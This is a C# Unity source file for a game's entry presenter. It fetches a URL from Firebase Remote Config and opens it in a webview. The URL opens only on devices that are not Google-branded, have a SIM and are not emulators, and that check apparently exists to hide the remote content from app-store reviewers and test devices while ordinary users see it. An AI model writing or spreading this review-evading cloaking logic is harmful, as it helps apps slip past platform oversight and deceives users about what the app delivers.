using Firebase;
using Firebase.Extensions;
using Firebase.RemoteConfig;
using Game.Constants;
using ModestTree;
using UnityEngine;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Utils;
using Utils.WebView;
using Utils.WebView.Interfaces;
using Zenject;

namespace Game.Entry
{
    public class EntryPresenter : IInitializable
    {
        public EntryPresenter(IWebViewController webViewController)
        {
            _webViewController = webViewController;
        }

        private const int SceneIndex = 1;
        private const string UrlFirebaseKey = "url";

        private readonly IWebViewController _webViewController;

        private bool _isStarted = false;

        public void Initialize()
        {
            Start();
        }

        private void Start()
        {
            if (_isStarted) return;

            _isStarted = true;
            
            if (PlayerPrefs.HasKey(ProjectConstants.UrlPlayerPrefsKey))
            {
                SceneManager.LoadScene(SceneIndex);
                
                var url = PlayerPrefs.GetString(ProjectConstants.UrlPlayerPrefsKey);
                _webViewController.OpenUrl(url);
            }
            else
            {
                FirebaseApp
                    .CheckAndFixDependenciesAsync()
                    .ContinueWithOnMainThread(task => {
                        var dependencyStatus = task.Result;
                        if (dependencyStatus == DependencyStatus.Available)
                        {
                            FirebaseRemoteConfig.DefaultInstance.FetchAndActivateAsync()
                                .ContinueWithOnMainThread(_ => OnComplete());
                        }
                    });

                void OnComplete()
                {
                    var url = FirebaseRemoteConfig.DefaultInstance.GetValue(UrlFirebaseKey).StringValue;
                    if (Validate(url))
                    {
                        SceneManager.LoadScene(SceneIndex);

                        PlayerPrefs.SetString(ProjectConstants.UrlPlayerPrefsKey, url);
                        _webViewController.OpenUrl(url);
                    }
                    else
                    {
                        SceneManager.LoadScene(SceneIndex);
                    }
                }
            }
        }

        private bool Validate(string url)
        {
            var isUrlEmpty = url.IsEmpty();
            if (isUrlEmpty) return false;

            var isGoogle = SystemInfo.deviceModel.Contains("Google");
            if (isGoogle) return false;

            var hasSim = CheckSim.HasSim();
            if (!hasSim) return false;
            
            var isEmulator = EmulatorValidator.IsEmulator();
            if (isEmulator) return false;

            return true;
        }
    }
}